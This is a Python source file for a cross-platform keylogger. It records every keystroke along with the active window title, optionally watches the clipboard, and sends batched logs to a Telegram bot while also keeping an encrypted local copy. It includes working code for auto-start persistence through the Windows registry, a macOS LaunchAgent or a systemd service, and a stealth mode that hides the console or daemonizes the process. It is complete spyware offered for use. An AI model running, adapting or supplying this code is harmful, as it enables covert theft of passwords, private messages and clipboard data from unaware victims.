from dotenv import load_dotenv
import pynput.keyboard
import threading
import asyncio
import datetime
import platform
import os
import sys
import time
import logging
import queue
import ctypes
import hashlib
import base64
from cryptography.fernet import Fernet

# Optional imports for clipboard and active window title
if platform.system() == "Windows":
    import win32gui
    import win32clipboard
elif platform.system() == "Darwin":
    try:
        from AppKit import NSWorkspace  # type: ignore
    except ImportError:
        NSWorkspace = None
    import subprocess
elif platform.system() == "Linux":
    import subprocess

class ClipboardHandler:
    def __init__(self, logger):
        self.logger = logger
        self.clipboard_last = None
        self.stop_event = threading.Event()

    def get_clipboard(self):
        system = platform.system()
        try:
            if system == "Windows":
                import win32clipboard
                win32clipboard.OpenClipboard()
                data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                return data
            elif system == "Darwin":
                p = subprocess.Popen(['pbpaste'], stdout=subprocess.PIPE)
                data, _ = p.communicate()
                return data.decode('utf-8')
            elif system == "Linux":
                # Try xclip first
                p = subprocess.Popen(['xclip', '-selection', 'clipboard', '-o'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                data, err = p.communicate()
                if p.returncode != 0:
                    # fallback to xsel
                    p = subprocess.Popen(['xsel', '-b', '-o'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    data, err = p.communicate()
                    if p.returncode != 0:
                        self.logger.warning("Clipboard utilities xclip/xsel not found or not working.")
                        return None
                return data.decode('utf-8')
            else:
                return None
        except Exception as e:
            self.logger.error(f"Error getting clipboard data: {e}")
            return None

    def clipboard_monitor(self, log_queue):
        while not self.stop_event.is_set():
            data = self.get_clipboard()
            if data and data != self.clipboard_last:
                self.clipboard_last = data
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                log_entry = f"[{timestamp}] Clipboard changed: {data}"
                log_queue.put(log_entry)
            time.sleep(1)

    def start(self, log_queue):
        t = threading.Thread(target=self.clipboard_monitor, args=(log_queue,), daemon=True)
        t.start()
        return t

    def stop(self):
        self.stop_event.set()

class WindowTitleHandler:
    def __init__(self, logger):
        self.logger = logger

    def get_active_window_title(self):
        try:
            system = platform.system()
            if system == "Windows":
                import win32gui
                hwnd = win32gui.GetForegroundWindow()
                return win32gui.GetWindowText(hwnd)
            elif system == "Darwin":
                if NSWorkspace:
                    active_app = NSWorkspace.sharedWorkspace().frontmostApplication()
                    return active_app.localizedName()
                else:
                    return "Unknown"
            elif system == "Linux":
                import subprocess
                root = subprocess.Popen(['xprop', '-root', '_NET_ACTIVE_WINDOW'], stdout=subprocess.PIPE)
                stdout, _ = root.communicate()
                window_id = stdout.decode().strip().split()[-1]
                window = subprocess.Popen(['xprop', '-id', window_id, 'WM_NAME'], stdout=subprocess.PIPE)
                stdout, _ = window.communicate()
                title = stdout.decode().strip().split('=')[-1].strip().strip('"')
                return title
            else:
                return "Unknown"
        except Exception as e:
            self.logger.error(f"Error getting active window title: {e}")
            return "Unknown"

class Keylogger:
    MAX_LOG_FILE_SIZE = 1024 * 1024  # 1MB max log file size for rotation

    def __init__(self, api_token=None, chat_id=None, enable_clipboard=False, log_file="keylog.enc", encryption_key=None, auto_start=False, stealth_mode=False):
        self.api_token = api_token
        self.chat_id = chat_id
        self.enable_clipboard = enable_clipboard
        self.log_file = log_file
        self.encryption_key = encryption_key or self.generate_key()
        self.cipher = Fernet(self.encryption_key)
        self.buffer = []
        self.modifiers = set()
        self.log_queue = queue.Queue()
        self.loop = None
        self.telegram_task = None
        self.stop_event = threading.Event()
        self.logger = self.setup_logger()
        self.listener = None
        self.clipboard_thread = None
        self.clipboard_handler = ClipboardHandler(self.logger)
        self.window_title_handler = WindowTitleHandler(self.logger)
        self.new_log_event = asyncio.Event()
        self.auto_start = auto_start
        self.stealth_mode = stealth_mode

        if self.auto_start:
            self.setup_auto_start()

        if self.stealth_mode:
            self.enable_stealth_mode()

        # Check Telegram library availability
        try:
            import telegram
            self.telegram_available = True
        except ImportError:
            self.logger.warning("Telegram library not found. Telegram sending disabled.")
            self.telegram_available = False

    def setup_logger(self):
        logger = logging.getLogger("Keylogger")
        if not logger.hasHandlers():
            logger.setLevel(logging.INFO)
            handler = logging.StreamHandler(sys.stdout)
            formatter = logging.Formatter('%(asctime)s - %(message)s')
            handler.setFormatter(formatter)
            logger.addHandler(handler)
        return logger

    def generate_key(self):
        password = b"my_secret_password"
        key = hashlib.sha256(password).digest()
        return base64.urlsafe_b64encode(key)

    def encrypt_and_save(self, data):
        try:
            self.rotate_log_file_if_needed()
            encrypted = self.cipher.encrypt(data.encode())
            with open(self.log_file, "ab") as f:
                f.write(encrypted + b"\n")
        except Exception as e:
            self.logger.error(f"Error saving encrypted log: {e}")

    def rotate_log_file_if_needed(self):
        try:
            if os.path.exists(self.log_file):
                size = os.path.getsize(self.log_file)
                if size >= self.MAX_LOG_FILE_SIZE:
                    backup_file = self.log_file + ".bak"
                    if os.path.exists(backup_file):
                        os.remove(backup_file)
                    os.rename(self.log_file, backup_file)
                    self.logger.info(f"Log file rotated: {self.log_file} -> {backup_file}")
        except Exception as e:
            self.logger.error(f"Error rotating log file: {e}")

    def get_active_window_title(self):
        return self.window_title_handler.get_active_window_title()

    def clipboard_monitor(self):
        self.clipboard_thread = self.clipboard_handler.start(self.log_queue)

    def on_press(self, key):
        try:
            if key in {pynput.keyboard.Key.shift, pynput.keyboard.Key.shift_r}:
                self.modifiers.add("Shift")
            elif key in {pynput.keyboard.Key.ctrl, pynput.keyboard.Key.ctrl_r}:
                self.modifiers.add("Ctrl")
            elif key in {pynput.keyboard.Key.alt, pynput.keyboard.Key.alt_r}:
                self.modifiers.add("Alt")
            else:
                self.process_key(key)
        except Exception as e:
            self.logger.error(f"Error in on_press: {e}")

    def on_release(self, key):
        try:
            if key in {pynput.keyboard.Key.shift, pynput.keyboard.Key.shift_r}:
                self.modifiers.discard("Shift")
            elif key in {pynput.keyboard.Key.ctrl, pynput.keyboard.Key.ctrl_r}:
                self.modifiers.discard("Ctrl")
            elif key in {pynput.keyboard.Key.alt, pynput.keyboard.Key.alt_r}:
                self.modifiers.discard("Alt")
        except Exception as e:
            self.logger.error(f"Error in on_release: {e}")

    def process_key(self, key):
        shift_map = {
            '1': '!',
            '2': '@',
            '3': '#',
            '4': '$',
            '5': '%',
            '6': '^',
            '7': '&',
            '8': '*',
            '9': '(',
            '0': ')',
            '-': '_',
            '=': '+',
            '[': '{',
            ']': '}',
            '\\': '|',
            ';': ':',
            '\'': '"',
            ',': '<',
            '.': '>',
            '/': '?',
            '`': '~'
        }
        char = ""
        try:
            if hasattr(key, 'char') and key.char is not None:
                char = key.char
                if "Shift" in self.modifiers:
                    if char in shift_map:
                        char = shift_map[char]
                    else:
                        char = char.upper()
                if "Ctrl" in self.modifiers or "Alt" in self.modifiers:
                    char = f"<{'-'.join(sorted(self.modifiers))}+{char}>"
            else:
                if key == pynput.keyboard.Key.space:
                    char = " "
                elif key == pynput.keyboard.Key.enter:
                    char = "\n"
                elif key == pynput.keyboard.Key.backspace:
                    if self.buffer:
                        self.buffer.pop()
                        # Remove last log entry from queue if possible
                        try:
                            # This is a workaround: recreate queue without last entry
                            temp_list = []
                            while not self.log_queue.empty():
                                temp_list.append(self.log_queue.get_nowait())
                            if temp_list:
                                temp_list.pop()
                            for item in temp_list:
                                self.log_queue.put(item)
                        except Exception as e:
                            self.logger.error(f"Error handling backspace in log queue: {e}")
                    return
                else:
                    try:
                        char = f"<{key.name}>"
                    except AttributeError:
                        char = ""
        except Exception as e:
            self.logger.error(f"Error processing key: {e}")
            char = ""

        if char:
            self.buffer.append(char)
            self.log_keystroke(char)

    def log_keystroke(self, char):
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        window_title = self.get_active_window_title()
        log_entry = f"[{timestamp}] [{window_title}] {char}"
        self.log_queue.put(log_entry)
        # Signal new log event for Telegram sender
        if self.loop and self.new_log_event:
            self.loop.call_soon_threadsafe(self.new_log_event.set)

    async def send_to_telegram(self, message):
        if not self.api_token or not self.chat_id or not self.telegram_available:
            return
        try:
            from telegram import Bot
            from telegram.constants import ParseMode
            bot = Bot(self.api_token)
            await bot.send_message(chat_id=self.chat_id, text=message, parse_mode=ParseMode.MARKDOWN)
        except Exception as e:
            self.logger.error(f"Error sending message to Telegram: {e}")

    async def telegram_sender(self):
        while not self.stop_event.is_set():
            await self.new_log_event.wait()
            self.new_log_event.clear()
            messages = []
            max_batch_size = 50
            while not self.log_queue.empty() and len(messages) < max_batch_size:
                messages.append(self.log_queue.get())
            if messages:
                message = "\n".join(messages)
                await self.send_to_telegram(message)
                self.save_logs_encrypted(message)

    def save_logs_encrypted(self, message):
        try:
            self.encrypt_and_save(message)
        except Exception as e:
            self.logger.error(f"Error saving logs: {e}")

    def setup_auto_start(self):
        system = platform.system()
        try:
            if system == "Windows":
                import winreg
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                     r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
                exe_path = sys.executable
                script_path = os.path.abspath(__file__)
                command = f'"{exe_path}" "{script_path}"'
                winreg.SetValueEx(key, "Keylogger", 0, winreg.REG_SZ, command)
                self.logger.info("Auto-start enabled in Windows registry.")
            elif system == "Darwin":
                plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.user.keylogger</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{os.path.abspath(__file__)}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>"""
                launch_agents_dir = os.path.expanduser("~/Library/LaunchAgents")
                if not os.path.exists(launch_agents_dir):
                    os.makedirs(launch_agents_dir)
                plist_path = os.path.join(launch_agents_dir, "com.user.keylogger.plist")
                with open(plist_path, "w") as f:
                    f.write(plist_content)
                self.logger.info(f"Auto-start enabled with launch agent: {plist_path}")
            elif system == "Linux":
                service_content = f"""[Unit]
Description=Keylogger Service

[Service]
ExecStart={sys.executable} {os.path.abspath(__file__)}
Restart=always

[Install]
WantedBy=default.target
"""
                systemd_dir = os.path.expanduser("~/.config/systemd/user")
                if not os.path.exists(systemd_dir):
                    os.makedirs(systemd_dir)
                service_path = os.path.join(systemd_dir, "keylogger.service")
                with open(service_path, "w") as f:
                    f.write(service_content)
                os.system(f"systemctl --user enable keylogger.service")
                self.logger.info(f"Auto-start enabled with systemd service: {service_path}")
            else:
                self.logger.warning("Auto-start not supported on this platform.")
        except Exception as e:
            self.logger.error(f"Error setting up auto-start: {e}")

    def enable_stealth_mode(self):
        system = platform.system()
        try:
            if system == "Windows":
                # Hide console window
                whnd = ctypes.windll.kernel32.GetConsoleWindow()
                if whnd != 0:
                    ctypes.windll.user32.ShowWindow(whnd, 0)  # 0 = SW_HIDE
                    ctypes.windll.kernel32.CloseHandle(whnd)
                self.logger.info("Stealth mode enabled: console window hidden on Windows.")
            elif system in ("Linux", "Darwin"):
                # Daemonize process
                if os.fork() > 0:
                    sys.exit(0)
                os.setsid()
                if os.fork() > 0:
                    sys.exit(0)
                sys.stdout.flush()
                sys.stderr.flush()
                with open('/dev/null', 'rb', 0) as f:
                    os.dup2(f.fileno(), sys.stdin.fileno())
                with open('/dev/null', 'ab', 0) as f:
                    os.dup2(f.fileno(), sys.stdout.fileno())
                    os.dup2(f.fileno(), sys.stderr.fileno())
                self.logger.info("Stealth mode enabled: daemonized on Unix.")
            else:
                self.logger.warning("Stealth mode not supported on this platform.")
        except Exception as e:
            self.logger.error(f"Error enabling stealth mode: {e}")

    def start_clipboard_monitor(self):
        if self.enable_clipboard:
            self.clipboard_monitor()

    def start(self):
        self.logger.info("Starting keylogger...")
        self.start_clipboard_monitor()
        self.listener = pynput.keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        self.listener.start()
        self.loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self.loop)
        self.telegram_task = self.loop.create_task(self.telegram_sender())
        try:
            self.loop.run_forever()
        except KeyboardInterrupt:
            self.stop_event.set()
            self.listener.stop()
            self.loop.stop()
            self.logger.info("Keylogger stopped.")
        finally:
            if self.clipboard_thread and self.clipboard_thread.is_alive():
                self.clipboard_handler.stop()
                self.clipboard_thread.join()
            self.loop.close()

if __name__ == "__main__":
    # Replace with your Telegram bot token and chat ID or set to None to disable Telegram sending
    
    load_dotenv()  # This loads variables from .env into environment variables
    
    API_TOKEN = os.getenv("API_TOKEN")
    CHAT_ID = os.getenv("CHAT_ID")
    ENABLE_CLIPBOARD_MONITOR = True
    AUTO_START = False
    STEALTH_MODE = False

    keylogger = Keylogger(api_token=API_TOKEN, chat_id=CHAT_ID, enable_clipboard=ENABLE_CLIPBOARD_MONITOR, auto_start=AUTO_START, stealth_mode=STEALTH_MODE)
    keylogger.start()
